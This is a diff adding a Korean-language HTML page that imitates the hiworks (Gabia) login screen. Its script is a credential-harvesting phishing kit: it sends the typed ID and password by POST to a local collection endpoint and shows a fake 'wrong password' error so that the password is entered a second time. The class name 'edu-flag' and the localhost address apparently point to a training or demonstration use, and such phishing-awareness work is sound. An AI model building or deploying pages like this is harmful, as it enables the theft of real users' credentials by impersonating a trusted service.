@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>hiworks 로그인</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "맑은 고딕", sans-serif;
+        }
+
+        body {
+            background: #f2f5f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* 좌측 상단 로고 */
+        .logo-top {
+            width: 100%;
+            padding: 32px 50px;
+            font-size: 28px;
+            font-weight: 700;
+            color: #1e73ff;
+        }
+
+        /* 중앙 박스 */
+        .center-box {
+            width: 380px;
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .main-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #111;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #444;
+            margin-bottom: 26px;
+        }
+
+        /* 입력란 */
+        .input-wrapper {
+            width: 100%;
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .input {
+            width: 100%;
+            padding: 12px 14px 12px 38px;
+            font-size: 15px;
+            border: 1px solid #cfd5e0;
+            border-radius: 6px;
+            background: white;
+        }
+
+        .input:focus {
+            outline: none;
+            border-color: #1e73ff;
+            box-shadow: 0 0 0 1px #1e73ff;
+        }
+
+        .input-icon {
+            width: 18px;
+            position: absolute;
+            left: 12px;
+            top: 12px;
+            opacity: 0.55;
+        }
+
+        /* 다음 버튼 */
+        .btn-next {
+            width: 100%;
+            padding: 12px 0;
+            font-size: 17px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        /* 비활성 버튼 */
+        .btn-disabled {
+            background: #c6dcf8;
+            color: #ffffff;
+            cursor: default;
+        }
+
+        /* 활성 버튼 */
+        .btn-enabled {
+            background: #1e73ff;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-enabled:hover {
+            background: #1664dd;
+        }
+
+        /* 에러메시지 */
+        .error-message {
+            margin-top: 6px;
+            font-size: 13px;
+            color: #d32f2f;
+            display: none;
+        }
+
+        /* 공지사항 */
+        .notice-line {
+            font-size: 14px;
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            color: #444;
+        }
+
+        .notice-icon {
+            color: #e57a00;
+        }
+
+        .notice-new {
+            color: #ff4e4e;
+            font-weight: 700;
+        }
+
+        /* ERP 배너 (크기 절반으로 축소) */
+        .banner {
+            width: 380px;         /* 기존 380px*/
+            height: 55px;         /* 기존 110px → 55px */
+            margin: 22px auto 0 auto;
+            background: #1e73ff;
+            border-radius: 6px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+
+        /* 교육용 표시 */
+        .edu-flag {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #d32f2f;
+        }
+
+        @media (max-width: 420px) {
+            .center-box {
+                width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-top">hiworks</div>
+
+    <div class="center-box">
+        <div class="main-title">로그인</div>
+        <div class="subtitle">도메인을 포함한 로그인 ID를 입력하세요.</div>
+
+        <form id="login-form">
+
+            <!-- ID 입력 -->
+            <div class="input-wrapper">
+                <img class="input-icon" src="https://cdn-icons-png.flaticon.com/512/561/561127.png">
+                <input class="input" id="id" name="ID" type="text" placeholder="id@company.onhiworks.com">
+            </div>
+
+            <!-- PW 입력 -->
+            <div class="input-wrapper">
+                <img class="input-icon" src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png">
+                <input class="input" id="pw" name="PW" type="password" placeholder="비밀번호">
+            </div>
+
+            <p id="error-message" class="error-message"></p>
+
+            <button class="btn-next btn-disabled" id="login-button" type="submit">다음</button>
+        </form>
+
+        <!-- 공지 -->
+        <div class="notice-line">
+            <span class="notice-icon">📢</span>
+            <span>공지사항 · 이석관리 근태연동 기능 오픈 안내</span>
+            <span class="notice-new">N</span>
+        </div>
+
+        <!-- ERP 배너 (절반 크기) -->
+        <div class="banner">하이웍스 ERP 출시</div>
+
+        <div class="edu-flag">©Gabia Inc.</div>
+    </div>
+
+    <script>
+        const idInput = document.getElementById("id");
+        const pwInput = document.getElementById("pw");
+        const loginButton = document.getElementById("login-button");
+        const errorBox = document.getElementById("error-message");
+        let attempt = 0;
+
+        /* 버튼 활성화/비활성 업데이트 */
+        function updateButtonState() {
+            const idFilled = idInput.value.trim().length > 0;
+            const pwFilled = pwInput.value.trim().length > 0;
+
+            if (idFilled && pwFilled) {
+                loginButton.classList.remove("btn-disabled");
+                loginButton.classList.add("btn-enabled");
+                loginButton.disabled = false;
+            } else {
+                loginButton.classList.remove("btn-enabled");
+                loginButton.classList.add("btn-disabled");
+                loginButton.disabled = true;
+            }
+        }
+
+        idInput.addEventListener("input", updateButtonState);
+        pwInput.addEventListener("input", updateButtonState);
+        updateButtonState();
+
+        /* 로그인 처리 */
+        document.getElementById("login-form").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const idValue = idInput.value.trim();
+            const pwValue = pwInput.value.trim();
+
+            if (!idValue || !pwValue) {
+                errorBox.style.display = "block";
+                errorBox.textContent = "ID와 비밀번호를 모두 입력해 주세요.";
+                return;
+            }
+
+            const data = new URLSearchParams();
+            data.append("ID", idValue);
+            data.append("PW", pwValue);
+
+            fetch("http://127.0.0.1:5000/collect", {
+                method: "POST",
+                body: data
+            }).catch(() => {});
+
+            if (attempt === 0) {
+                attempt++;
+                errorBox.style.display = "block";
+                errorBox.textContent = "아이디 또는 비밀번호가 올바르지 않습니다.";
+                pwInput.value = "";
+                pwInput.focus();
+                updateButtonState();
+                return;
+            }
+
+            loginButton.disabled = true;
+            loginButton.textContent = "로그인 중...";
+            errorBox.style.display = "none";
+
+            setTimeout(() => {
+                alert("(입력값은 모두 기록되었습니다.)");
+            }, 700);
+        });
+    </script>
+
+</body>
+</html>
